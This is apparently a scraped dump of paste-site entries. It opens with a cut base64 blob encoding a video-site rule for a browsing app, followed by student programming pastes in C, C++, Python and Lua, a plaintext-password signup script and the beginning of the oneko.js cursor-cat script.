ICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIGFuY2hvcklkICsgXFxcXFxcXCJ4NVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZFswXS50aXRsZSA9IFxcXFxcXFwi5bGV5byAL+aUtui1t1xcXFxcXFwiICsgZFswXS50aXRsZTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0VmFyKGFuY2hvcklkICsgXFxcXFxcXCJ4NVxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hYNURlc2MoXFxcXFxcXCJmbG9hdCYmMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgZCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGV4dHJhID0gaXQuZXh0cmEgfHwge307XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRyYS5jbHMgPSBcXFxcXFxcIng1YWlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGl0LmV4dHJhID0gZXh0cmE7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXFxcXFwieDVhaVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkSXRlbUFmdGVyKGFuY2hvcklkLCBkKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9hc3QoXFxcXFxcXCJBSeWMuemFjeaIkOWKn1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGQubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coXFxcXFxcXCJwYXJzZUxhenlSdWxlQXN5bmM6XFxcXFxcXCIgKyBkLmxlbmd0aCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkLmxlbmd0aCA+IDAgPyBcXFxcXFxcIjFcXFxcXFxcIiA6IFxcXFxcXFwiMFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB9LCBydWxlLCBsb2NhdGlvbi5ocmVmLCBhbmNob3JJZCwgd2hpdGUpLCAkJCQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFxcXFxcXFwiMFxcXFxcXFwiID09IGlucHV0KSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LmNoZWNrYyA9IHdpbmRvdy5jaGVja2MgKyAxO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qaWYgKHdpbmRvdy5jaGVja2MgPiAxMjApIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmJhLmxvZyhcXFxcXFxcIuaJp+ihjOi2hei/hzMw56eS77yM5peg5rOV6Kej5p6QXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7Ki9cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHdpbmRvdy5jaGVjazAsIDI1MCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgLy99XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jaGVja3VybCA9IGxvY2F0aW9uLmhyZWY7XFxcXG5cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBjaGVja3UwKCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmNoZWNrdXJsICE9IGxvY2F0aW9uLmhyZWYpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vaGFzaOWPkeeUn+S6huWPmOWMllxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuY2hlY2tjID0gMDtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVjazAoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDIwMDApO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dChjaGVja3UwLCAyNTApO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoZWNrdTAoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgfSkpO1xcXFxuICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZmJhLmxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHdpbmRvdy5jaGVjazAsIDI1MCk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgd2luZG93LmNoZWNrYyA9IDA7XFxcXG4gICAgICAgICAgICB3aW5kb3cuY2hlY2swID0gY2hlY2swO1xcXFxuICAgICAgICAgICAgY2hlY2swKCk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LCBydWxlLCBhbmNob3JJZCwgc3RvcmFnZTAuZ2V0SXRlbShcXFxcXFxcIndoaXRlXFxcXFxcXCIsIFtdKSk7XFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6aaW6aG1XFxcIixcXFwicGF0aFxcXCI6XFxcImhvbWVcXFwiLFxcXCJydWxlXFxcIjpcXFwidmFyIGQgPSBbXTtcXFxcbmxldCB1cmwgPSDnvZHnq5k7XFxcXG5sZXQgYW5jaG9ySWQgPSB1cmw7XFxcXG5sZXQganMgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UveDVhaVxcXFxcXFwiKShNWV9SVUxFLnRpdGxlLCBhbmNob3JJZCk7XFxcXG5sZXQgaXRlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3VcXFxcXFxcIikoTVlfUlVMRS50aXRsZSwgZ2V0SG9tZSh1cmwpKTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgdXJsOiB1cmwsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBcXFxcXFxcIjEwMCUmJmZsb2F0XFxcXFxcXCIsXFxcXG4gICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB1cmxJbnRlcmNlcHRvcjogaXRlLFxcXFxuICAgICAgICBjYW5CYWNrOiB0cnVlLFxcXFxuICAgICAgICBqczoganMsXFxcXG4gICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZVxcXFxuICAgIH1cXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgaWQ6IGFuY2hvcklkXFxcXG4gICAgfVxcXFxufSk7XFxcXG5cXFxcbnNldFJlc3VsdChkKTtcXFwifV1cIixcInByb3h5XCI6XCJcIn0iLCJ0aXRsZSI6IumdkuaYpeehrOi1t+adpeesrDHpm4blnKjnur/mkq3mlL4gLSBMSUJWSU8ifQ==
qvja5N72,doubly linkedList,moldovexc,C,Sunday 28th of May 2023 09:03:43 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct Task {
  char description[100];
  struct Task* next;
  struct Task* previous; 
};

struct Task* createTask(char description[]){
 struct Task* newTask = (struct Task*)malloc(sizeof(struct Task));
 strcpy(newTask->description, description);
 newTask->next = NULL;
 newTask->previous = NULL;
 return newTask;
}

void addTask(struct Task** head, struct Task* newTask){
 if(*head == NULL) {
   *head = newTask;
 } else {
   struct Task* currentElement = *head;
 while(currentElement->next != NULL){
  currentElement = currentElement->next;
  }
 currentElement->next = newTask;
 newTask->previous = currentElement;
 }
}

struct Task* displayFirstTask(struct Task* head){
 if (head == NULL){
   printf(""No tasks found!\n"");
 } else{
  struct Task* firstTask = head;
  while(firstTask->previous !=NULL){
   firstTask = firstTask-> previous;
  }
  return firstTask;
 }
}

void deleteTask(struct Task** head, struct Task* task){
 if (*head == task){
   *head = task->next;
 }
 if(task->previous !=NULL){
  task->previous->next = task->next;
 }
 if(task->next !=NULL){
  task->next->previous = task->previous;
 }
 free(task);
}
void displayTasks(struct Task* head){
 struct Task* currentTask = head;
 if(currentTask == NULL){
  printf(""No tasks found!\n"");
 } else{
  printf(""Tasks:\n"");
  while(currentTask !=NULL){
   printf(""%s\n"", currentTask->description);
   currentTask = currentTask->next;
  }
 }
}
 void freeAllTasks(struct Task** head){
  struct Task* currentTask = *head;
  while(currentTask !=NULL){
   struct Task* next = currentTask->next;
   free(currentTask);
   currentTask = next;
  }
  *head = NULL;
 }

 int main(){
   
  //initialize queue
  struct Task* tasks = NULL;
 
  //initialize tasks
  struct Task* firstTask = createTask(""Task 1"");
  struct Task* secondTask = createTask(""Task 2"");
  struct Task* thirdTask = createTask(""Task 3"");

  //add tasks to queue
  addTask(&tasks,firstTask);
  addTask(&tasks->next, secondTask);
  addTask(&tasks->next, thirdTask);
 
  // print  all tasks
  displayTasks(tasks);
  //print first element in fifo
  struct Task* firstTaskInQueue = displayFirstTask(tasks);
  if(firstTask !=NULL){
   printf(""First Task: %s\n"", firstTaskInQueue -> description);
 }
  //delete specific task 
  deleteTask(&tasks,firstTask);
  //show result
  displayTasks(tasks);
  //delete all tasks to save memory
  freeAllTasks(&tasks);
  //show result
  displayTasks(tasks);
 }"
rq72726Z,database to slugs (fun 4),mate2code,Python,Sunday 28th of May 2023 08:59:21 AM CDT,"import itertools
from collections import defaultdict
from string import ascii_lowercase as alphabet

flatten = itertools.chain.from_iterable
def double_generator(gen): return itertools.tee(gen, 2)


database = {
    0: {'name1': 'John', 'name2': 'Spam', 'born': '1985'},  # JohnSpam85a
    1: {'name1': 'John', 'name2': 'Spam', 'born': '1985'},  # JohnSpam85b
    2: {'name1': 'John', 'name2': 'Eggs', 'born': '1991'},  # JohnEggs91
    3: {'name1': 'John', 'name2': 'Eggs', 'born': '1992'},  # JohnEggs92
    4: {'name1': 'Emma', 'name2': 'Fish', 'born': '1995'},  # EmmaFish95a
    5: {'name1': 'Emma', 'name2': 'Fish', 'born': '1995'},  # EmmaFish95b
    6: {'name1': 'Mary', 'name2': 'Beer', 'born': '2000'},  # MaryBeer
    7: {'name1': 'Mary', 'name2': 'Wine', 'born': '2000'},  # MaryWine
    8: {'name1': 'Owen', 'name2': 'Wine', 'born': '2000'},  # Owen
    9: {'name1': 'Ruth', 'name2': 'Milk', 'born': '2000'}   # Ruth
}


def find_duplicates(number_to_slug, dup_gen_to_refine):
    slug_to_numbers = defaultdict(list)
    if dup_gen_to_refine is not None:
        for number in flatten(dup_gen_to_refine):
            slug = number_to_slug[number]
            slug_to_numbers[slug].append(number)
    else:
        for number, slug in number_to_slug.items():
            slug_to_numbers[slug].append(number)
    for block in slug_to_numbers.values():
        if len(block) > 1:
            yield block


def find_slugs(database):

    """"""
	Assign unique slugs to set of people. Slugs are as short as possible. (New elements only added to ensure uniqueness.)
    https://codereview.stackexchange.com/questions/285146
	""""""

    step_functions = [
        lambda _, n: database[n]['name1'],
        lambda _, n: database[n]['name2'],
        lambda _, n: database[n]['born'][2:4],
        lambda i, _: alphabet[i]
    ]

    number_to_slug = {n: '' for n in database}
    dup_gen_to_refine = None

    for step_fun in step_functions:
        dup_gen = find_duplicates(number_to_slug, dup_gen_to_refine)
        dup_gen_to_append, dup_gen_to_refine = double_generator(dup_gen)
        for block in dup_gen_to_append:
            for i, n in enumerate(block):
                number_to_slug[n] += step_fun(i, n)

    return number_to_slug
"
7tJts6Lb,Nika dlist,Technoblade777,C++,Sunday 28th of May 2023 08:43:17 AM CDT,"#include<iostream>
using namespace std;
struct dlist
{
    int info;
    dlist *prev, *next;
};



int main()
{
    int k = 0;  //проверка на случай наличия одного элемента в спике
    //объявление головы списка
    int x;
    cin >> x; k++;
    dlist *head = new dlist;
    head->info = x;
    head->prev = nullptr; head->next = nullptr;
    dlist *p = new dlist;
    p = head;

    //ввод тела списка
    cin >> x;
    while(x!=0)
    {
        k++;
        dlist *r = new dlist;
        r->info = x; r->prev=nullptr; r->next=nullptr;
        p->next = r;
        r->prev=p;
        p = r;
        cin >> x;
    }

    if(k==1){cout << ""В списке недостаточное количество элементов""; return 0;}

    //проверка на убывание
    int f = 1;
    p = head->next;
    while(p!=nullptr)
    {
        if(p->info>=p->prev->info){f = 0; break;}
        p=p->next;
    }

    if(f == 1)
    {
        p = head->next;
        while(p!=nullptr)
        {
            if(p->info%5==0&&p->prev->info%5==0)
            {
                int x = p->info + p->prev->info;
                dlist *r = new dlist;
                r->info = x;
                r->prev = p->prev;
                r->next = p;
                p->prev->next = r;
                p->prev = r;
            }
            p = p->next;
        }
    }
    else {
        int a, b;
        cout << ""a: "";
        cin >> a;
        cout << ""b: "";
        cin >> b;
        p = head;
        while (p != nullptr) {
            if (p->next == nullptr) { break; }
            if (p->info >= a && p->info <= b) {
                dlist *r;
                if (p->next->next != nullptr) //... p y z NULL
                {
                    r = p->next;
                    p->next = p->next->next;
                    p->next->prev = p;
                    r->next = nullptr;
                    r->prev = nullptr;
                    delete r;
                    p = p->next;
                } else if (p->next != nullptr)//... p y NULL
                {
                    r = p->next;
                    p->next = nullptr;
                    r->next = nullptr;
                    r->prev = nullptr;
                    delete r;
                    p = p->next;
                } else {
                    p = p->next;
                }
            } else {
                p = p->next;
            }
        }
    }
    //вывод списка
    p = head;
    while(p!=nullptr)
    {
        cout << p->info << "" "";
        p = p->next;
    }

    //удаление списка
    while(head!=nullptr)
    {
        dlist *r = head;
        head = head->next;
        delete r;
    }
}"
RUD51nn6,Глубина добавляемых элементов,pasholnahuy,C++,Sunday 28th of May 2023 08:38:49 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <tuple>
#include <set>
#include <map>
#include <unordered_map>

using namespace std;

class BST {
    struct Node {
        int key;
        int depth;
        Node *l = nullptr, *r = nullptr;
        explicit Node(int key) : key(key) {}
    }
            *root = nullptr;

    bool contains(Node *n, int key) const {
        if (!n) {
            return false;
        } else if (key == n->key) {
            return true;
        } else if (key > n->key) {
            return contains(n->r, key);
        } else {
            return contains(n->l, key);
        }
    }

    void insert(Node *n, int key) {
        if (!root) {
            root = new Node(key);
            return;
        }
        if (key == n->key) {
            return;
        }
        if (key < n->key) {
            if (n->l) {
                insert(n->l, key);
            } else {
                n->l = new Node(key);
            }

        } else {
            if (n->r) {
                insert(n->r, key);
            } else {
                n->r = new Node(key);
            }
        }
    }
    void MakeDepth(Node *n, int cur_depth){
        if (n == nullptr){
            return;
        }
        n->depth = cur_depth;
        depths[n->key] = n->depth;
        MakeDepth(n->l, cur_depth+1);
        MakeDepth(n->r, cur_depth+1);

    };

public:
    map<int, int> depths;
    bool contains(int key) const {
        return contains(root, key);
    }

    void insert(int key) {
        return insert(root, key);
    }

    void MakeDepth(){
        return MakeDepth(root, 1);
    }
};

int main() {
    int n = -1;
    BST tree;
    vector<int> vec;
    while (n != 0) {
        cin >> n;
        if (n != 0) {
            vec.emplace_back(n);
            tree.insert(n);
        }
    }
    tree.MakeDepth();
    for (auto el: vec){
        cout << tree.depths[el] << "" "";
    }
    return 0;
};"
Av9k7kGS,Остов с наименьшим максимальным ребром,pasholnahuy,C++,Sunday 28th of May 2023 08:13:12 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <iomanip>
#include <tuple>
#include <map>

using namespace std;

class DSU {
public:
    vector<int> parent;
    vector<int> height;

    DSU(int n) {
        parent.resize(n);
        for (int i = 0; i < n; ++i) {
            parent[i] = i;
        }
        height.assign(n, 0);
    }

    int findRoot(int v) {
        if (v == parent[v]) {
            return v;
        }
        int ans = findRoot(parent[v]);
        parent[v] = ans;
        return ans;
    }

    void Union(int v1, int v2) {
        if (height[v1] >= height[v2]) {
            parent[v2] = v1;
            height[v1] = max(height[v1], height[v2] + 1);
        } else {
            parent[v1] = v2;
            height[v2] = max(height[v2], height[v1] + 1);
        }
    }


};

int main() {
    int n, m;
    cin >> n >> m;
    vector<pair<double, pair<int, int>>> edges;
    map<pair<int, int>, int> edges_num;
    for (int i = 0; i < m; ++i) {
        int x, y, w;
        cin >> x >> y >> w;
        edges.push_back({w, {--x, --y}});
        if (!edges_num.contains({x, y})){
            edges_num[{x, y}] = i;
        }
    }
    DSU graph(n);
    sort(edges.begin(), edges.end());
    double ans = 0;
    for (auto [weight, coords]: edges) {
        if (graph.findRoot(coords.first) != graph.findRoot(coords.second)){
            graph.Union(graph.findRoot(coords.first), graph.findRoot(coords.second));
            ans += weight;
            cout << edges_num[coords] + 1 << "" "";
        }
    }
//    cout << '\n' << ans;
    return 0;
};"
e9uMs0VB,robot,pluggeman,Lua,Sunday 28th of May 2023 08:11:29 AM CDT,"local x = 0
local y = 0
local z = 0
local direction = 0

DIRECTION_SOUTH = 0
DIRECTION_WEST = 1
DIRECTION_NORTH = 2
DIRECTION_EAST = 3

local CONFIG_PATH = ""robot_config""

function load()
    if fs.exists(CONFIG_PATH) then
        handle = fs.open(CONFIG_PATH, 'r')
        x = tonumber(handle.readLine())
        y = tonumber(handle.readLine())
        z = tonumber(handle.readLine())
        direction = tonumber(handle.readLine())
        handle.close()
    else
        initGPS()
    end
end

function save()
    handle = fs.open(CONFIG_PATH, 'w')
    handle.writeLine(x)
    handle.writeLine(y)
    handle.writeLine(z)
    handle.writeLine(direction)
    handle.close()
end

function log()
    print(""x: "" .. x)
    print(""y: "" .. y)
    print(""z: "" .. z)
    print(""dir: "" .. direction)
end

function initGPS()
    term.write(""x-pos: "")
    x = tonumber(read())
    term.write(""y-pos: "")
    y = tonumber(read())
    term.write(""z-pos: "")
    z = tonumber(read())
    term.write(""direction (0-3)"")
    direction = tonumber(read())
    save()
end

function getX()
    return x
end
function getY()
    return y
end
function getZ()
    return z
end
function getDirection()
    return direction
end

function moveX(count, cb)
    if count > 0 then
        turnTo(3)
    elseif count < 0 then
        turnTo(1)
    end
    forward(math.abs(count), cb)
end

function moveToX(c, cb)
    moveX(c - x, cb)
end

function moveY(count, cb)
    if count > 0 then
        up(count, cb)
    elseif count < 0 then
        down(math.abs(count), cb)
    end
end

function moveToY(c, cb)
    moveY(c - y, cb)
end

function moveZ(count, cb)
    if count > 0 then
        turnTo(0)
    elseif count < 0 then
        turnTo(2)
    end
    forward(math.abs(count), cb)
end

function moveToZ(c, cb)
    moveZ(c - z, cb)
end

function move(cx, cy, cz, cb)
    moveX(cx, cb)
    moveY(cy, cb)
    moveZ(cz, cb)
end

function moveTo(cx, cy, cz, cb)
    moveToX(cx, cb)
    moveToY(cy, cb)
    moveToZ(cz, cb)
end

function forward(count, cb)
    count = count or 1
    for i = 1, count do
        while not turtle.forward() do
            turtle.dig()
        end
        if direction == DIRECTION_SOUTH then
            z = z + 1
        elseif direction == DIRECTION_NORTH then
            z = z - 1
        elseif direction == DIRECTION_WEST then
            x = x - 1
        elseif direction == DIRECTION_EAST then
            x = x + 1
        end
        if cb then cb() end
    end
end

function back(count, cb)
    count = count or 1
    for i = 1, count do
        if turtle.back() then
            if direction == DIRECTION_SOUTH then
                z = z + 1
            elseif direction == DIRECTION_NORTH then
                z = z - 1
            elseif direction == DIRECTION_WEST then
                x = x - 1
            elseif direction == DIRECTION_EAST then
                x = x + 1
            end
        end
        if cb then cb() end
    end
end

function down(count, cb)
    count = count or 1
    for i = 1, count do
        while not turtle.down() do
            turtle.digDown()
        end
        y = y - 1 
        if cb then cb() end
    end
end

function up(count, cb)
    count = count or 1
    for i = 1, count do
        while not turtle.up() do
            turtle.digUp()
        end
        y = y + 1
        if cb then cb() end
    end
end

function turnleft(count, cb)
    count = count or 1
    for i = 1, count do
        if turtle.turnLeft() then
            if direction <= 0 then
                direction = 3
            else
                direction = direction - 1
            end
            if cb then cb() end
        end
    end
end

function turnright(count, cb)
    count = count or 1
    for i = 1, count do
        if turtle.turnRight() then
            if direction >= 3 then
                direction = 0
            else
                direction = direction + 1
            end
            if cb then cb() end
        end
    end
end

function turnTo(dir, cb)
    count = direction - dir
    dif = math.abs(count)
    if dif > 2 then
        count = -(count / dif)
    end
    if count > 0 then
        turnleft(count)
    elseif count < 0 then
        turnright(-count)
    end
    if cb then cb() end
end

function dropAmount(slot, amount)
    if amount == nil then
        return turtle.getItemCount(slot)
    elseif amount < 0 then
        return turtle.getItemCount(slot) + amount
    else return amount
    end
end

function drop(slot, amount)
    amount = dropAmount(slot, amount)
    turtle.select(slot)
    turtle.drop(amount)
end

function dropUp(slot, amount)
    amount = dropAmount(slot, amount)
    turtle.select(slot)
    turtle.dropUp(amount)
end

function dropDown(slot, amount)
    amount = dropAmount(slot, amount)
    turtle.select(slot)
    turtle.dropDown(amount)
end

function compareItems(s1, s2)
    turtle.select(s1)
    return turtle.compareTo(s2)
end

function compareFrontTo(slot)
    turtle.select(slot)
    return turtle.compare()
end

function compareDownTo(slot)
    turtle.select(slot)
    return turtle.compareDown()
end

function compareUpTo(slot)
    turtle.select(slot)
    return turtle.compareUp()
end"
Fk7xcuPE,Untitled,MeehoweCK,C++,Sunday 28th of May 2023 08:11:07 AM CDT,"#include <iostream>
#include <vector>

using namespace std;

void fMaxMin(vector<int*> vec, int* max, int**& min, int** cMax, int& cMin)
{
	int val_max, val_min, val_cMax, val_cMin;

	// miejsce na Twój kod
}

int main()
{
	auto vec = vector<int>{1, 2, 1, 42, 2, 2, 42, 1, 1, 2, 1, 42};
	auto vecP = vector<int*>();
	for (auto& item : vec)
	{
		vecP.push_back(&item);
	}

	int max, min, cMax, cMin;

	int* ptr_min = &min;
	int** ptr2_min = &ptr_min;

	int* ptr_cMax = &cMax;

	fMaxMin(vecP, &max, ptr2_min, &ptr_cMax, cMin);

	cout << ""max: "" << max << endl;
	cout << ""min: "" << min << endl;
	cout << ""cMax: "" << cMax << endl;
	cout << ""cMin: "" << cMin << endl;

	return 0;
}"
9qvqxqFN,mine,pluggeman,Lua,Sunday 28th of May 2023 08:10:46 AM CDT,"os.loadAPI(""robot"")

function init()
    term.write('Neue Position? [j/n]')
    i = read()
    if i == 'j' then
        robot.initGPS()
    elseif i == 'n' then
        robot.load()
    else
        term.clear()
        term.setCursorPos(0, 0)
        init()
    end
end
init()

IGNORE_COUNT = 4

CHUNKS = 1
MIN_HEIGHT = 8
MAX_HEIGHT = 38
Y_STEPS = 3
LAYERS = math.floor((MAX_HEIGHT - MIN_HEIGHT) / Y_STEPS)

STEPS_PER_CHUNK = 16

LENGTH = CHUNKS * STEPS_PER_CHUNK
STEPS = LENGTH - 1

X_START = robot.getX()
Y_START = robot.getY()
Z_START = robot.getZ()
DIR_START = robot.getDirection()

current_layer = 0

moves_per_layer = LENGTH * LENGTH + LENGTH - 2
moves_y = (Y_START - (MAX_HEIGHT - MIN_HEIGHT)) * LAYERS * 2
moves = moves_per_layer * LAYERS + moves_y
fuel_level_start = turtle.getFuelLevel()

function checkDown()
    for i = 1, IGNORE_COUNT do
        if robot.compareDownTo(i) then
            return false
        end
    end
    return true
end

function checkUp()
    for i = 1, IGNORE_COUNT do
        if robot.compareUpTo(i) then
            return false
        end
    end
    return true
end

function compare()
    if checkUp() then turtle.digUp() end
    if checkDown() then turtle.digDown() end
end

function mine()
    for current_layer = 0, LAYERS - 1 do
        
        robot.moveToY(MIN_HEIGHT + current_layer * Y_STEPS)
        
        for i = 1, LENGTH / 2 do
            robot.moveZ(STEPS, compare)
            robot.moveX(1, compare)
            robot.moveZ(-STEPS, compare)

            if i < LENGTH / 2 then
                robot.moveX(1, compare)
            end
            for j = 1, IGNORE_COUNT do
                robot.drop(j, -1)
                for k = IGNORE_COUNT  + 1, 16 do
                    if robot.compareItems(j, k) then
                        robot.drop(k)
                    end
                end
            end
        end

        robot.moveToX(X_START)
        robot.moveToZ(Z_START)
        
        robot.turnTo(DIR_START)

        robot.moveToY(Y_START)

        term.clear()
        term.setCursorPos(1, 1)
        cur_layer = current_layer + 1
        moves_done = fuel_level_start - turtle.getFuelLevel()
        print(""layer ""..cur_layer..""/""..LAYERS)
        print(moves_done..""/""..moves.."" moves"")

        for j = IGNORE_COUNT+1, 16 do
            robot.drop(j)
        end
    end
end

term.clear()
term.setCursorPos(1, 1)
print(""Total moves: "" .. moves)
print(""Fuel: "" .. fuel_level_start)
fuel = fuel_level_start - moves

if fuel < 0 then
    fuel = math.abs(fuel)
    coal_needed = math.ceil(fuel/80)
    print(""Not enough fuel - ""..fuel.."" fuel needed. (""..coal_needed.."" coal)"")
else
    os.sleep(3)
    mine()
end"
JdCaYHjQ,signup1.py,DrAungWinHtut,Python,Sunday 28th of May 2023 08:08:57 AM CDT,"import os


def Signup():
    while True:
        uname = input('Username: ')
        fname = uname + '.dat'
        if ' ' in uname:
            print('SPACE in username, pls try again!')
            continue
        else:
            if os.path.exists(fname):
                print(f'username {uname} already exists, pls try again!')
                continue
            else:
                # Username OK
                break

    while True:
        password = input('Password: ')
        confirm_password = input('Confirm Password: ')
        if password == confirm_password:
            # password OK
            break
        else:
            print('Passwords do not match, pls try again')
            continue

    # Saving password in username.dat file
    file = open(fname, 'w')
    file.write(password)
    file.close()
    print('Signup Successfully...')


def Signin():
    while True:
        uname = input('Username: ')
        password = input('Password: ')
        fname = uname + '.dat'

        if os.path.exists(fname):
            # Username OK
            file = open(fname, 'r')
            password_in_file = file.read().rstrip()  # to remove Enter key \n
            file.close()
            if password == password_in_file:
                print('Signin Successfully....')
                # Main Code here
                break
            else:
                print('Wrong password...')
                ans = input('Exit or Continue? (e\\c)')
                if ans == 'e':
                    exit()
                else:
                    continue

        else:
            print(f'Username {uname} does not exists, pls try again')
            continue


# Program Start Here
# Signup()
Signin()
"
HkjeBasS,Untitled,MeehoweCK,C++,Sunday 28th of May 2023 08:04:18 AM CDT,"#include <iostream>
#include <vector>

using namespace std;

void fMaxMin(vector<int*> vec, int* max, int**& min, int** cMax, int& cMin)
{
	// miejsce na kod funkcji
}

int main()
{
	auto vec = vector<int>{1, 2, 1, 42, 2, 2, 42, 1, 1, 2, 1, 42};
	auto vecP = vector<int*>();
	for (auto& item : vec)
	{
		vecP.push_back(&item);
	}

	int max, min, cMax, cMin;

	// miejsce na wywołanie funkcji

	cout << ""max: "" << max << endl;
	cout << ""min: "" << min << endl;
	cout << ""cMax: "" << cMax << endl;
	cout << ""cMin: "" << cMin << endl;

	return 0;
}"
LCV83GZq,neko.js,agunq,JavaScript,Sunday 28th of May 2023 08:00:29 AM CDT,"
(function oneko() {
    const nekoEl = document.createElement(""div"");
    let nekoPosX = 32;
    let nekoPosY = 32;
    let mousePosX = 0;
    let mousePosY = 0;
    let frameCount = 0;
    let idleTime = 0;
    let idleAnimation = null;
    let idleAnimationFrame = 0;
    const nekoSpeed = 10;
    const spriteSets = {
        idle: [[-3, -3]],
        alert: [[-7, -3]],
        scratch: [
            [-5, 0],
            [-6, 0],
            [-7, 0],
        ],
        tired: [[-3, -2]],
        sleeping: [
            [-2, 0],
            [-2, -1],
        ],
        N: [
            [-1, -2],
            [-1, -3],
        ],
        NE: [
            [0, -2],
            [0, -3],
        ],
        E: [
            [-3, 0],
            [-3, -1],
        ],
        SE: [
            [-5, -1],
            [-5, -2],
        ],
        S: [
            [-6, -3],
            [-7, -2],
        ],
        SW: [
            [-5, -3],
            [-6, -1],
        ],
        W: [
            [-4, -2],
            [-4, -3],
        ],
        NW: [
            [-1, 0],
            [-1, -1],
        ],
    };
    function create() {
        nekoEl.id = ""oneko"";
        nekoEl.style.width = ""32px"";
        nekoEl.style.height = ""32px"";
        nekoEl.style.position = ""fixed"";
